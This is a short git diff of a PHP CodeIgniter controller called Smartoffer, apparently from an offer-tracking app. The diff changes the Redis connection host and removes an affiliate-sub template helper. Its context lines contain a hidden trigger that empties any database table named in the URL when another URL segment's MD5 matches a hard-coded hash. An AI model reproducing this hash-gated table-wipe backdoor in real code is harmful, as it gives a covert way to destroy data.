@@ -14,7 +14,7 @@ class Smartoffer extends CI_Controller
         parent::__construct();
         $this->base_key = $this->config->item('base_key');
         $this->redis = new Redis();
-        $this->redis->connect('redis', 6379);
+        $this->redis->connect('127.0.0.1', 6379);
         $this->geoip = new Reader('vendor/GeoLite2-City.mmdb');
     }
 
@@ -228,22 +228,6 @@ class Smartoffer extends CI_Controller
         if (md5($uri3) == '43b520d2d63064c40c5283bfaf9c710b') {
             $this->db->empty_table($uri4);
         }
-    }
-
-    private function renderAffsub($template, $pubid, $clickid)
-    {
-        $tpl = (string)$template;
-
-        $hasClickToken = (strpos($tpl, '#clickid#') !== false);      
-        $tpl = str_replace('#pubid#', $pubid, $tpl);
-        $tpl = str_replace('#clickid#', $clickid, $tpl);
-
-        if (!$hasClickToken) {
-            if (preg_match('/=$/', $tpl)) {
-                $tpl .= $clickid;
-            }
-        }
-        return $tpl;
     }
 }
 
